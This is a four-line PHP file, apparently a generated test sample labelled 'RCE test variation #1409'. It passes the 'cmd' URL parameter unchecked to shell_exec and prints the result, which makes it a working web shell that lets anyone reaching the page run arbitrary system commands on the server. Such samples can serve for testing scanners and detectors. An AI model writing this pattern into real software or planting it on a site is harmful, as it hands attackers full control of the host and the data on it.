<?php
// RCE test variation #1409
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>